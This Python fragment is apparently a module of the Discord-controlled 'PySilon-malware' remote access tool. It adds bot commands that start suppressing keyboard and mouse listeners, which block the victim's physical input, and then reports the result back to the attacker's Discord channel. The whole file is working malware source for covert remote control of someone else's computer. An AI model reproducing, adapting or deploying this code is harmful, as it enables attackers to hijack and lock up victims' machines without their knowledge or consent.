from pynput import keyboard, mouse
# end of imports

# on message
elif message.content == '.block-input':
    await message.delete()

    async def on_press():
        pass

    async def on_release():
        pass

    async def on_click():
        pass

    keyboard_listener = keyboard.Listener(suppress=True)
    mouse_listener = mouse.Listener(suppress=True)

    keyboard_listener.start()
    mouse_listener.start()
    embed = discord.Embed(title="🚫 Input Blocked",description=f'```Input has been blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
    await message.channel.send(embed=embed)

elif message.content == '.unblock-input':
    await message.delete()
    keyboard_listener.stop()
    mouse_listener.stop()
    embed = discord.Embed(title="🟢 Input Unblocked",description=f'```Input has been unblocked. Block it by using .block-input```', colour=discord.Colour.green())
    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
    await message.channel.send(embed=embed)
